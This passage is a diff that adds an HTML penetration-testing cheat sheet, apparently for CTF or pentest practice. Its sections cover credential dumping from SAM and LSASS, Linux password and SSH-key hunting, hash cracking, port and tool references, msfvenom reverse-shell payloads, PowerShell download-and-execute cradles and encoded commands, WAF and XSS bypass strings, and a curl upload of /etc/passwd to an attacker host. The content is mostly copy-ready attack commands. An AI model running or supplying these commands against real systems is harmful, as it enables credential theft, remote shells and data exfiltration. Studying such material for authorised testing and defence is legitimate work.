+<span class="c-cmd">secretsdump.py</span> <span class="c-flag">-sam</span> SAM <span class="c-flag">-system</span> SYSTEM LOCAL
+
+<span class="c-comment"># LSASS dump</span>
+<span class="c-comment"># Task Manager → lsass.exe → Create dump</span>
+procdump.exe <span class="c-flag">-accepteula</span> <span class="c-flag">-ma</span> lsass.exe lsass.dmp
+<span class="c-cmd">pypykatz</span> lsa minidump lsass.dmp</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🐧 Linux Credential Hunt</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># /etc/shadow (need root or shadow group)</span>
+cat /etc/shadow
+john --wordlist=rockyou.txt shadow.txt
+hashcat <span class="c-flag">-m 1800</span> shadow.txt rockyou.txt  <span class="c-comment"># sha512crypt</span>
+
+<span class="c-comment"># Search for passwords in files</span>
+grep <span class="c-flag">-r</span> <span class="c-string">"password"</span> /var/www/ 2>/dev/null
+grep <span class="c-flag">-r</span> <span class="c-string">"passwd"</span> /etc/ 2>/dev/null
+find / <span class="c-flag">-name</span> <span class="c-string">"*.conf"</span> 2>/dev/null | xargs grep <span class="c-flag">-l</span> <span class="c-string">"password"</span>
+
+<span class="c-comment"># Bash history</span>
+cat ~/.bash_history
+cat /root/.bash_history
+find / <span class="c-flag">-name</span> .bash_history 2>/dev/null | xargs cat
+
+<span class="c-comment"># SSH keys</span>
+find / <span class="c-flag">-name</span> id_rsa 2>/dev/null
+find / <span class="c-flag">-name</span> authorized_keys 2>/dev/null</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔐 Hash Cracking Reference</div>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Hash Type</th><th>hashcat -m</th><th>john --format</th></tr>
+          <tr><td>MD5</td><td>0</td><td>raw-md5</td></tr>
+          <tr><td>SHA1</td><td>100</td><td>raw-sha1</td></tr>
+          <tr><td>SHA256</td><td>1400</td><td>raw-sha256</td></tr>
+          <tr><td>bcrypt</td><td>3200</td><td>bcrypt</td></tr>
+          <tr><td>NTLM</td><td>1000</td><td>nt</td></tr>
+          <tr><td>NTLMv2</td><td>5600</td><td>netntlmv2</td></tr>
+          <tr><td>Kerberoast</td><td>13100</td><td>krb5tgs</td></tr>
+          <tr><td>ASREPRoast</td><td>18200</td><td>krb5asrep</td></tr>
+          <tr><td>sha512crypt</td><td>1800</td><td>sha512crypt</td></tr>
+          <tr><td>Werkzeug SHA256</td><td>30120</td><td>-</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔨 Hashcat Modes & Rules</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Basic crack</span>
+hashcat <span class="c-flag">-m 0</span> hash.txt rockyou.txt
+
+<span class="c-comment"># With rules</span>
+hashcat <span class="c-flag">-m 0</span> hash.txt rockyou.txt <span class="c-flag">-r</span> /usr/share/hashcat/rules/best64.rule
+
+<span class="c-comment"># Mask attack (e.g. Password+4digits)</span>
+hashcat <span class="c-flag">-m 0</span> hash.txt <span class="c-flag">-a 3</span> <span class="c-string">'Password?d?d?d?d'</span>
+
+<span class="c-comment"># Combination attack</span>
+hashcat <span class="c-flag">-m 0</span> hash.txt <span class="c-flag">-a 1</span> words1.txt words2.txt
+
+<span class="c-comment"># Show cracked</span>
+hashcat <span class="c-flag">-m 0</span> hash.txt <span class="c-flag">--show</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 16: PORTS REFERENCE
+══════════════════════════════════════════════ -->
+<section id="ports" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-cyan">▸</div>
+    <div class="section-title">Common Ports & Services</div>
+    <div class="section-meta">REFERENCE</div>
+  </div>
+
+  <div class="qr-grid">
+    <div class="qr-item"><div class="qr-port">21</div><div class="qr-service">FTP</div><div class="qr-note">anon login, bounce</div></div>
+    <div class="qr-item"><div class="qr-port">22</div><div class="qr-service">SSH</div><div class="qr-note">key-based auth</div></div>
+    <div class="qr-item"><div class="qr-port">23</div><div class="qr-service">Telnet</div><div class="qr-note">cleartext</div></div>
+    <div class="qr-item"><div class="qr-port">25</div><div class="qr-service">SMTP</div><div class="qr-note">user enum, relay</div></div>
+    <div class="qr-item"><div class="qr-port">53</div><div class="qr-service">DNS</div><div class="qr-note">zone transfer</div></div>
+    <div class="qr-item"><div class="qr-port">80/443</div><div class="qr-service">HTTP/S</div><div class="qr-note">web exploitation</div></div>
+    <div class="qr-item"><div class="qr-port">110</div><div class="qr-service">POP3</div><div class="qr-note">mail access</div></div>
+    <div class="qr-item"><div class="qr-port">111</div><div class="qr-service">rpcbind</div><div class="qr-note">NFS enumeration</div></div>
+    <div class="qr-item"><div class="qr-port">135</div><div class="qr-service">MSRPC</div><div class="qr-note">Windows RPC</div></div>
+    <div class="qr-item"><div class="qr-port">139/445</div><div class="qr-service">SMB</div><div class="qr-note">file share, relay</div></div>
+    <div class="qr-item"><div class="qr-port">143</div><div class="qr-service">IMAP</div><div class="qr-note">mail protocol</div></div>
+    <div class="qr-item"><div class="qr-port">161/162</div><div class="qr-service">SNMP</div><div class="qr-note">community string</div></div>
+    <div class="qr-item"><div class="qr-port">389/636</div><div class="qr-service">LDAP/S</div><div class="qr-note">AD enumeration</div></div>
+    <div class="qr-item"><div class="qr-port">1433</div><div class="qr-service">MSSQL</div><div class="qr-note">xp_cmdshell</div></div>
+    <div class="qr-item"><div class="qr-port">1521</div><div class="qr-service">Oracle DB</div><div class="qr-note">SQLPlus</div></div>
+    <div class="qr-item"><div class="qr-port">2049</div><div class="qr-service">NFS</div><div class="qr-note">showmount</div></div>
+    <div class="qr-item"><div class="qr-port">3268/3269</div><div class="qr-service">GC LDAP</div><div class="qr-note">Global Catalog</div></div>
+    <div class="qr-item"><div class="qr-port">3306</div><div class="qr-service">MySQL</div><div class="qr-note">LOAD_FILE, outfile</div></div>
+    <div class="qr-item"><div class="qr-port">3389</div><div class="qr-service">RDP</div><div class="qr-note">evil-winrm alt</div></div>
+    <div class="qr-item"><div class="qr-port">5432</div><div class="qr-service">PostgreSQL</div><div class="qr-note">COPY TO/FROM</div></div>
+    <div class="qr-item"><div class="qr-port">5985</div><div class="qr-service">WinRM HTTP</div><div class="qr-note">evil-winrm</div></div>
+    <div class="qr-item"><div class="qr-port">5986</div><div class="qr-service">WinRM HTTPS</div><div class="qr-note">evil-winrm -S</div></div>
+    <div class="qr-item"><div class="qr-port">6379</div><div class="qr-service">Redis</div><div class="qr-note">unauthenticated RCE</div></div>
+    <div class="qr-item"><div class="qr-port">8080</div><div class="qr-service">HTTP-Alt</div><div class="qr-note">app server</div></div>
+    <div class="qr-item"><div class="qr-port">27017</div><div class="qr-service">MongoDB</div><div class="qr-note">no-auth default</div></div>
+    <div class="qr-item"><div class="qr-port">88</div><div class="qr-service">Kerberos</div><div class="qr-note">AS-REP, TGT</div></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 17: TOOLS CHEATSHEET
+══════════════════════════════════════════════ -->
+<section id="tools" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-purple">▸</div>
+    <div class="section-title">Tools Cheatsheet</div>
+    <div class="section-meta">REFERENCE</div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Tool</th><th>Category</th><th>Quick Use</th></tr>
+      <tr><td>nmap</td><td>Recon</td><td><code>nmap -sV -sC -p- $IP</code></td></tr>
+      <tr><td>gobuster</td><td>Web</td><td><code>gobuster dir -u URL -w wordlist</code></td></tr>
+      <tr><td>feroxbuster</td><td>Web</td><td><code>feroxbuster -u URL --depth 3</code></td></tr>
+      <tr><td>ffuf</td><td>Web/Fuzz</td><td><code>ffuf -u URL/FUZZ -w wordlist</code></td></tr>
+      <tr><td>sqlmap</td><td>SQLi</td><td><code>sqlmap -r req.txt --batch --dbs</code></td></tr>
+      <tr><td>burpsuite</td><td>Web Proxy</td><td>Intercept, repeat, intruder</td></tr>
+      <tr><td>nikto</td><td>Web Scan</td><td><code>nikto -h http://$IP</code></td></tr>
+      <tr><td>crackmapexec</td><td>AD</td><td><code>crackmapexec smb $IP -u user -p pass</code></td></tr>
+      <tr><td>bloodhound-python</td><td>AD</td><td><code>bloodhound-python -u user -p pass -d domain -ns $IP -c all</code></td></tr>
+      <tr><td>certipy</td><td>AD CS</td><td><code>certipy find -u user@domain -p pass</code></td></tr>
+      <tr><td>impacket-*</td><td>AD/SMB</td><td>psexec, secretsdump, GetUserSPNs, etc.</td></tr>
+      <tr><td>evil-winrm</td><td>Windows</td><td><code>evil-winrm -i $IP -u user -p pass</code></td></tr>
+      <tr><td>bloodyAD</td><td>AD ACL</td><td><code>bloodyAD --host $IP -d domain -u user -p pass</code></td></tr>
+      <tr><td>hashcat</td><td>Cracking</td><td><code>hashcat -m MODE hash.txt rockyou.txt</code></td></tr>
+      <tr><td>john</td><td>Cracking</td><td><code>john --wordlist=rockyou.txt hash.txt</code></td></tr>
+      <tr><td>linpeas</td><td>Linux PE</td><td><code>curl URL | bash</code></td></tr>
+      <tr><td>winPEAS</td><td>Windows PE</td><td><code>.\winPEASx64.exe</code></td></tr>
+      <tr><td>chisel</td><td>Pivoting</td><td>Server + client for SOCKS tunnel</td></tr>
+      <tr><td>socat</td><td>Shells</td><td>Stable PTY shell over network</td></tr>
+      <tr><td>msfvenom</td><td>Payloads</td><td><code>msfvenom -p ... LHOST= LPORT= -f exe</code></td></tr>
+      <tr><td>netcat</td><td>Listeners</td><td><code>nc -lvnp 4444</code></td></tr>
+      <tr><td>pspy</td><td>Linux</td><td>Monitor processes without root</td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 18: PAYLOADS LIBRARY
+══════════════════════════════════════════════ -->
+<section id="payloads" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-red">▸</div>
+    <div class="section-title">Payload Library</div>
+    <div class="section-meta">REFERENCE</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🔥 msfvenom Quick Payloads</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Linux ELF</span>
+msfvenom <span class="c-flag">-p</span> linux/x64/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> elf > shell.elf
+
+<span class="c-comment"># Windows EXE</span>
+msfvenom <span class="c-flag">-p</span> windows/x64/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> exe > shell.exe
+
+<span class="c-comment"># PHP</span>
+msfvenom <span class="c-flag">-p</span> php/reverse_php LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> raw > shell.php
+
+<span class="c-comment"># ASP / ASPX</span>
+msfvenom <span class="c-flag">-p</span> windows/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> asp > shell.asp
+msfvenom <span class="c-flag">-p</span> windows/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> aspx > shell.aspx
+
+<span class="c-comment"># Java WAR</span>
+msfvenom <span class="c-flag">-p</span> java/jsp_shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> war > shell.war
+
+<span class="c-comment"># Python</span>
+msfvenom <span class="c-flag">-p</span> python/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">📜 PowerShell Payloads</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Execution policy bypass</span>
+powershell <span class="c-flag">-ExecutionPolicy Bypass</span> <span class="c-flag">-File</span> script.ps1
+powershell <span class="c-flag">-exec bypass</span> <span class="c-flag">-c</span> <span class="c-string">"IEX(New-Object Net.WebClient).DownloadString('http://$IP/ps.ps1')"</span>
+
+<span class="c-comment"># Download cradles</span>
+IEX(New-Object Net.WebClient).DownloadString(<span class="c-string">'http://$IP:8888/script.ps1'</span>)
+iwr <span class="c-string">'http://$IP:8888/file.exe'</span> <span class="c-flag">-OutFile</span> C:\Temp\file.exe
+certutil <span class="c-flag">-urlcache</span> <span class="c-flag">-split</span> <span class="c-flag">-f</span> http://<span class="c-var">$IP</span>:8888/file.exe C:\Temp\file.exe
+bitsadmin <span class="c-flag">/transfer</span> job http://<span class="c-var">$IP</span>:8888/file.exe C:\Temp\file.exe
+
+<span class="c-comment"># Encoded command</span>
+$cmd = <span class="c-string">"IEX(wget 'http://$IP/rev.ps1' -UseBasicParsing)"</span>
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell <span class="c-flag">-EncodedCommand</span> $enc</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🌊 WAF Bypass Techniques</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">-- URL encoding</span>
+%27 = ' | %3C = < | %22 = " | %2F = /
+
+<span class="c-comment">-- Double encoding</span>
+%2527 → %27 → '
+%253C → %3C → <
+
+<span class="c-comment">-- Case mixing</span>
+SeLeCt InFoRmAtIoN_sChEmA.tAbLeS
+
+<span class="c-comment">-- Comment bypass</span>
+SELECT/**/username/**/FROM/**/users
+SE/**/LECT version()
+
+<span class="c-comment">-- Whitespace alternatives</span>
+SELECT%09username  (tab)
+SELECT%0aversion() (newline)
+
+<span class="c-comment">-- XSS filter bypass</span>
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img/src=x onerror=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔗 File Transfer Methods</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Linux → Download</span>
+wget http://<span class="c-var">$LHOST</span>:8888/file
+curl <span class="c-flag">-o</span> file http://<span class="c-var">$LHOST</span>:8888/file
+
+<span class="c-comment"># Linux → Upload (to your server)</span>
+curl <span class="c-flag">-F</span> <span class="c-string">"file=@/etc/passwd"</span> http://<span class="c-var">$LHOST</span>:8888/upload
+
+<span class="c-comment"># SCP</span>
+scp file <span class="c-var">user</span>@<span class="c-var">$IP</span>:/tmp/
+
+<span class="c-comment"># Python HTTP server</span>
+python3 <span class="c-flag">-m</span> http.server 8888
+
+<span class="c-comment"># SMB server (for Windows → upload)</span>
+<span class="c-cmd">smbserver.py</span> share /tmp/smb <span class="c-flag">-smb2support</span>
+<span class="c-comment"># Windows: copy \\$LHOST\share\file .</span>
+
+<span class="c-comment"># Base64 transfer</span>
+cat file | base64
+<span class="c-comment"># On target: echo BASE64 | base64 -d > file</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 19: WORDLISTS
+══════════════════════════════════════════════ -->
+<section id="wordlists" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-green">▸</div>
+    <div class="section-title">Wordlists Reference</div>
+    <div class="section-meta">REFERENCE</div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <tr><th>Path</th><th>Use Case</th><th>Size</th></tr>
+      <tr><td>/usr/share/wordlists/rockyou.txt</td><td>Password cracking</td><td>14M words</td></tr>
+      <tr><td>/usr/share/wordlists/dirb/common.txt</td><td>Directory brute</td><td>4.6K</td></tr>
+      <tr><td>/usr/share/wordlists/dirb/big.txt</td><td>Directory brute</td><td>20K</td></tr>
+      <tr><td>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</td><td>Dir brute (best)</td><td>30K</td></tr>
+      <tr><td>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</td><td>Subdomain enum</td><td>5K</td></tr>
+      <tr><td>/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</td><td>Subdomain (full)</td><td>110K</td></tr>
+      <tr><td>/usr/share/seclists/Usernames/top-usernames-shortlist.txt</td><td>Username enum</td><td>17</td></tr>
+      <tr><td>/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt</td><td>Password spray</td><td>10K</td></tr>
+      <tr><td>/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</td><td>LFI paths</td><td>929</td></tr>
+      <tr><td>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</td><td>SQLi payloads</td><td>-</td></tr>
+      <tr><td>/usr/share/seclists/Web-Shells/</td><td>Web shells</td><td>-</td></tr>
+      <tr><td>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt</td><td>Fast crack</td><td>75 words</td></tr>
+    </table>
+  </div>
+
+  <div class="alert alert-tip" style="margin-top:16px;">
+    <span class="alert-icon">💡</span>
+    <div class="alert-body">
+      <div class="alert-title">Install SecLists</div>
+      <code>sudo apt install seclists</code> or <code>git clone https://github.com/danielmiessler/SecLists /usr/share/seclists</code>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<!-- ═══════════════════════ JS ═══════════════════════ -->
+<script>
+// ── COPY CODE ──────────────────────────────────
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.style.color = 'var(--green)';
+    btn.style.borderColor = 'var(--green)';
+    setTimeout(() => {
+      btn.textContent = 'Copy';
+      btn.style.color = '';
+      btn.style.borderColor = '';
+    }, 1500);
+  });
+}
+
+// ── NAV ACTIVE ─────────────────────────────────
+const sections = document.querySelectorAll('section[id]');
+const navItems = document.querySelectorAll('.nav-item');
+
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      navItems.forEach(item => {
+        item.classList.remove('active');
+        if (item.getAttribute('href') === '#' + id) {
+          item.classList.add('active');
+        }
+      });
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+sections.forEach(s => observer.observe(s));
+
+// ── SEARCH ─────────────────────────────────────
+const searchInput = document.getElementById('globalSearch');
+const searchResults = document.getElementById('searchResults');
+
+// Build search index
+const searchIndex = [];
+document.querySelectorAll('.card').forEach(card => {
+  const title = card.querySelector('.card-title')?.innerText || '';
+  const content = card.innerText;
+  const section = card.closest('section')?.querySelector('.section-title')?.innerText || '';
+  searchIndex.push({ title, content: content.slice(0, 200), section, el: card });
+});
+
+document.querySelectorAll('.section').forEach(sec => {
+  const title = sec.querySelector('.section-title')?.innerText || '';
+  const id = sec.id;
+  searchIndex.push({ title, content: title, section: 'Section', el: sec, isSection: true, id });
+});
+
+searchInput.addEventListener('input', function() {
+  const query = this.value.toLowerCase().trim();
+  
+  if (!query) {
+    searchResults.style.display = 'none';
+    document.querySelectorAll('.searchable').forEach(el => el.classList.remove('hidden'));
+    return;
+  }
+  
+  const matches = searchIndex.filter(item => 
+    item.title.toLowerCase().includes(query) || 
+    item.content.toLowerCase().includes(query)
+  ).slice(0, 8);
+  
+  if (matches.length > 0) {
+    searchResults.innerHTML = matches.map(m => `
+      <div class="search-result-item" onclick="scrollToResult(this)" data-section="${m.isSection ? m.id : m.el.closest('section')?.id || ''}">
+        <div class="search-result-title">${highlight(m.title, query)}</div>
+        <div class="search-result-section">${m.section}</div>
+      </div>
+    `).join('');
+    searchResults.style.display = 'block';
+  } else {
+    searchResults.innerHTML = '<div class="search-result-item"><div class="search-result-title" style="color:var(--text3)">No results found</div></div>';
+    searchResults.style.display = 'block';
+  }
+});
+
+function highlight(text, query) {
+  const re = new RegExp(`(${query})`, 'gi');
+  return text.replace(re, '<span class="search-highlight">$1</span>');
+}
+
+function scrollToResult(el) {
+  const sectionId = el.dataset.section;
+  if (sectionId) {
+    document.getElementById(sectionId)?.scrollIntoView({ behavior: 'smooth' });
+  }
+  searchResults.style.display = 'none';
+  searchInput.value = '';
+}
+
+document.addEventListener('click', (e) => {
+  if (!e.target.closest('.header-search')) {
+    searchResults.style.display = 'none';
+  }
+});
+
+// ── ACCORDION ──────────────────────────────────
+document.querySelectorAll('.accordion-header').forEach(header => {
+  header.addEventListener('click', () => {
+    const acc = header.closest('.accordion');
+    acc.classList.toggle('open');
+  });
+});
+
+// ── KEYBOARD SHORTCUTS ─────────────────────────
+document.addEventListener('keydown', (e) => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    searchInput.focus();
+    searchInput.select();
+  }
+  if (e.key === 'Escape') {
+    searchResults.style.display = 'none';
+    searchInput.blur();
+  }
+});
+
+// ── NAV CLICK ──────────────────────────────────
+navItems.forEach(item => {
+  item.addEventListener('click', function() {
+    navItems.forEach(i => i.classList.remove('active'));
+    this.classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
